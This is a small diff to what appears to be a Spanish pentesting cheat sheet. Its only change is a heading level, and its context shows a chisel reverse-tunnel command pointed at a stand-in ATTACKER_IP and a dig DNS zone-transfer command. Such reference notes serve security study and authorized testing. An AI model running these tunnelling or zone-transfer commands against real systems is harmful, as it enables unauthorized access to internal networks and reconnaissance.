@@ -50,7 +50,7 @@ Víctima
 ```
 ./chisel client ATTACKER_IP:ATTACKER_PORT R:VICTIM_IP:VICTIM_PORT
 ```
-#### Domain Zone Transfer (AXFR)
+### Domain Zone Transfer (AXFR)
 ```
 dig @IP dominio axfr
 ```
